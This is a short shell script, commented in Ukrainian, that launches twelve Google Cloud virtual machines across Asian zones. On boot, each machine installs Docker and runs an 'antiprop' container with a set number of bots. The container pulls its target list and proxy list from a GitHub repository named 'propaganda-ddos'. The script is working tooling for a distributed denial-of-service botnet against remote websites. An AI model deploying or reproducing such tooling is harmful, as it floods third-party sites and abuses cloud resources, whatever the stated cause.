#!/bin/sh

ZONES=(asia-east1-b asia-east1-a asia-east1-c asia-east2-a asia-east2-b asia-east2-c asia-south2-a asia-south2-b asia-south2-c asia-southeast2-a asia-southeast2-b asia-southeast2-c)

botsnum=30
if [[ $1 -ge 1 ]]; then
    botsnum=$1
else 
    echo " ПОМИЛКА: Вкажіть правильно к-сть ботів для контейнера"
    exit 1
fi

echo "К-сть ботів в одному кониейнері: $botsnum"

for i in {1..12}; do 
    rand=$((RANDOM + RANDOM))
    gcloud compute instances create antiprop${rand} --zone=${ZONES[${i}]} --custom-cpu=2 --custom-memory=1 --metadata=startup-script="#!/bin/bash
    sudo apt update
    sudo apt install --yes apt-transport-https ca-certificates curl gnupg2 software-properties-common iftop htop
    curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
    sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/debian \$(lsb_release -cs) stable\"
    sudo apt update
    sudo apt install --yes docker-ce
    sudo usermod -aG docker \$USER
    sudo service docker restart

    docker run -d --rm lovefromukraine/antiprop --refresh=30 --dnsres=true --onlyproxy=false --bots ${botsnum} --checkproxy=true \
		--sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
		--proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
   "; 
done
